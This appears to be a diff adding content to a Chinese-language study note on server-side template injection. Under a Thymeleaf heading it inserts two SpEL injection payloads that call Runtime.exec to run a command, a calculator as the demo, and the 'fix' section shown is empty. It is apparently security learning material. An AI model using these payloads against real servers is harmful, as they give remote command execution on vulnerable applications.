@@ -7,7 +7,11 @@ SSTI:Server Side Template Injection，即服务端模板注入。
 作为视图层，常见于前后端不分离的项目。
 
 ## **Thymeleaf模板注入**
+```
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}__::.x
 
+__${T(java.lang.Runtime).getRuntime().exec("calc")}__::feng
+```
 
 
 ## **修复方案**
